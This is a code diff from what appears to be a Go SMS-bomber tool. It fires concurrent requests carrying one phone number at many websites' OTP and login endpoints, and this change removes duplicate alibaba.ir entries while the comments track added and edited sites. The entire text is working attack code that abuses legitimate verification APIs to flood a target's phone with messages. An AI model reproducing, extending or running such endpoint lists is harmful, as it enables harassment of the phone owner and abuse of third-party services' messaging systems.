@@ -257,10 +257,6 @@ func main() {
 		go sms("https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
-
-		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch)    // add site
 		go sms("https://student.classino.com/otp/v1/api/login", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
@@ -367,9 +363,6 @@ func main() {
 		go sms("https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch)   // edit :4/22/2025
 		go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // delete site: no Access
